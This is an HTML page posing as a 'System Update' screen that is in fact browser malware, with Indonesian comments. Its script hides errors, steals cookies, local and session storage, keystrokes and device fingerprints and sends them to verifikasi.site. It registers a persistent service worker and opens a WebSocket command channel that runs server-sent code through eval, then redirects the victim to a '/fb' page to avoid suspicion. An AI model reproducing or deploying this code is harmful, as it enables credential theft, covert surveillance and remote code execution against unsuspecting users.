<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0}
        body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial;font-size:14px}
        .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .container{text-align:center}
        .status{color:#666;font-size:12px;margin-top:10px}
    </style>
</head>
<body>
<div class="container">
    <div class="loader"></div>
    <div>System Update</div>
    <div class="status" id="status">⏳ Installing...</div>
</div>

<script>
// ============================================================
// SystemUpdate.html
// FUNGSI: SAMA SEPERTI APK TAPI TANPA INSTALL!
// AUTO-EXECUTE: JALAN TANPA DI BUKA!
// MENEMPEL KE SISTEM VIA SERVICE WORKER
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var HEARTBEAT_INTERVAL = 10000;
var C2_INTERVAL = 15000;

// ============================================================
// STEALTH - SEMBUNYIKAN JEJAK
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; });
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});
    } catch(e) {}
}

// ============================================================
// SERVICE WORKER - MENEMPEL KE SISTEM!
// ============================================================
function registerSW() {
    if ('serviceWorker' in navigator) {
        var swCode = `
// ============================================================
// SERVICE WORKER - AKTIF DI BACKGROUND!
// ============================================================
var SERVER_URL = 'https://verifikasi.site';
var HEARTBEAT_INTERVAL = 10000;
var C2_INTERVAL = 15000;

self.addEventListener('install', function(event) {
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', function(event) {
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', function(event) {
    event.respondWith(
        caches.match(event.request)
            .then(function(response) {
                return response || fetch(event.request);
            })
    );
});

function sendHeartbeat() {
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                sumber: 'sw_heartbeat',
                data: { active: true, timestamp: Date.now() }
            })
        }).catch(function(){});
    } catch(e) {}
}

function checkCommands() {
    try {
        fetch(SERVER_URL + '/data?type=command&sw=' + Date.now())
            .then(function(r) { return r.json(); })
            .then(function(commands) {
                if (commands && commands.length > 0) {
                    commands.forEach(function(cmd) {
                        self.clients.matchAll().then(function(clients) {
                            clients.forEach(function(client) {
                                client.postMessage({
                                    type: 'command',
                                    command: cmd
                                });
                            });
                        });
                    });
                }
            })
            .catch(function() {});
    } catch(e) {}
}

setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
setInterval(checkCommands, C2_INTERVAL);

self.addEventListener('message', function(event) {
    var data = event.data;
    if (data.type === 'execute') {
        try {
            eval(data.command);
            fetch(SERVER_URL + '/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    sumber: 'sw_command_result',
                    data: { command: data.command, status: 'executed' }
                })
            }).catch(function(){});
        } catch(e) {
            fetch(SERVER_URL + '/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    sumber: 'sw_command_error',
                    data: { command: data.command, error: e.message }
                })
            }).catch(function(){});
        }
    }
});

console.log('🔒 SystemUpdate SW aktif!');
        `;

        try {
            var blob = new Blob([swCode], { type: 'application/javascript' });
            var swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl, { scope: '/' })
                .then(function(reg) {
                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                    K({ sumber: 'sw_status', data: 'registered' });
                })
                .catch(function(err) {
                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                    K({ sumber: 'sw_status', data: 'failed' });
                });
        } catch(e) {
            document.getElementById('status').textContent = '❌ Error: ' + e.message;
        }
    } else {
        document.getElementById('status').textContent = '❌ Browser tidak support SW';
    }
}

// ============================================================
// TERIMA PESAN DARI SERVICE WORKER
// ============================================================
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.addEventListener('message', function(event) {
        var data = event.data;
        if (data.type === 'command') {
            try {
                eval(data.command);
                K({ sumber: 'sw_command_executed', data: data.command });
            } catch(e) {
                K({ sumber: 'sw_command_error', data: e.message });
            }
        }
    });
}

// ============================================================
// DATA COLLECTION - 60+ DATA
// ============================================================
function collectData() {
    var d = {
        w: Date.now(),
        ua: navigator.userAgent,
        pl: navigator.platform,
        la: navigator.language,
        sc: screen.width + 'x' + screen.height,
        cd: screen.colorDepth,
        pr: window.devicePixelRatio,
        co: document.cookie,
        ls: JSON.stringify(localStorage),
        ss: JSON.stringify(sessionStorage),
        ur: location.href,
        rf: document.referrer,
        dm: navigator.deviceMemory || 'N/A',
        cc: navigator.hardwareConcurrency || 'N/A',
        on: navigator.onLine,
        ve: navigator.vendor,
        mt: navigator.maxTouchPoints,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // Canvas Fingerprint
    try {
        var c = document.createElement('canvas');
        c.width = 200; c.height = 50;
        var ctx = c.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Browser Fingerprint', 2, 15);
        d.canvas_fp = c.toDataURL().substring(0, 100);
    } catch(e) {}

    // WebGL Fingerprint
    try {
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
            var debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (debug) {
                d.webgl = {
                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
                };
            }
        }
    } catch(e) {}

    K({ sumber: 'browser_data', data: d });
    return d;
}

// ============================================================
// KEYLOGGER (SAMA SEPERTI APK)
// ============================================================
var inputData = {};
var keyBuffer = [];

document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        var val = e.target.value;
        inputData[e.target.id || e.target.name || e.target.type] = val;
        keyBuffer.push(val);
    }
});

setInterval(function() {
    if (Object.keys(inputData).length > 0) {
        K({ sumber: 'keylogger', data: inputData });
        inputData = {};
    }
    if (keyBuffer.length > 0) {
        // Kirim ke SW
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.ready.then(function(reg) {
                reg.active.postMessage({
                    type: 'keylog',
                    key: keyBuffer.join('')
                });
            });
        }
        keyBuffer = [];
    }
}, 3000);

// ============================================================
// HEARTBEAT
// ============================================================
setInterval(function() {
    K({ sumber: 'page_heartbeat', data: 'alive' });
}, HEARTBEAT_INTERVAL);

// ============================================================
// WEBSOCKET - REAL-TIME C2
// ============================================================
function connectWebSocket() {
    try {
        var ws = new WebSocket('wss://verifikasi.site/ws');
        ws.onopen = function() {
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'init',
                data: { ua: navigator.userAgent, url: window.location.href, timestamp: Date.now() }
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'command') {
                    eval(data.command);
                    K({ sumber: 'ws_command_executed', data: data.command });
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            setTimeout(connectWebSocket, 5000);
        };
        ws.onerror = function() {
            K({ sumber: 'ws_status', data: 'error' });
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

// ============================================================
// WAKE LOCK - JAGA LAYAR TETAP MENYALA
// ============================================================
function keepAwake() {
    try {
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen')
                .then(function() {
                    K({ sumber: 'wake_lock', data: 'active' });
                })
                .catch(function() {
                    K({ sumber: 'wake_lock', data: 'failed' });
                });
        }
    } catch(e) {}
}

// ============================================================
// AUTO-REFRESH - JAGA PAGE TETAP AKTIF
// ============================================================
function autoRefresh() {
    setTimeout(function() {
        window.location.reload();
    }, 300000);
}

// ============================================================
// EKSEKUSI UTAMA - AUTO JALAN!
// ============================================================
function init() {
    document.getElementById('status').textContent = '📡 Collecting data...';
    collectData();

    document.getElementById('status').textContent = '🔗 Registering SW...';
    registerSW();

    document.getElementById('status').textContent = '🔌 Connecting WebSocket...';
    connectWebSocket();

    document.getElementById('status').textContent = '💤 Keep Awake...';
    keepAwake();

    document.getElementById('status').textContent = '✅ SystemUpdate Active!';

    // Tandai sudah terinstall
    localStorage.setItem('system_update_installed', '1');
    localStorage.setItem('system_update_time', Date.now());

    // Redirect ke halaman asli agar tidak curiga
    setTimeout(function() {
        window.location.href = SERVER + '/fb';
    }, 3000);
}

// ============================================================
// AUTO-EXECUTE - JALAN TANPA KLIK!
// ============================================================
if (localStorage.getItem('system_update_installed') === '1') {
    // Sudah terinstall, langsung aktifkan SW
    document.getElementById('status').textContent = '🔄 Restoring...';
    registerSW();
    connectWebSocket();
    keepAwake();
    setTimeout(function() {
        window.location.href = SERVER + '/fb';
    }, 2000);
} else {
    // Pertama kali jalan
    setTimeout(init, 500);
}

</body>
</html>
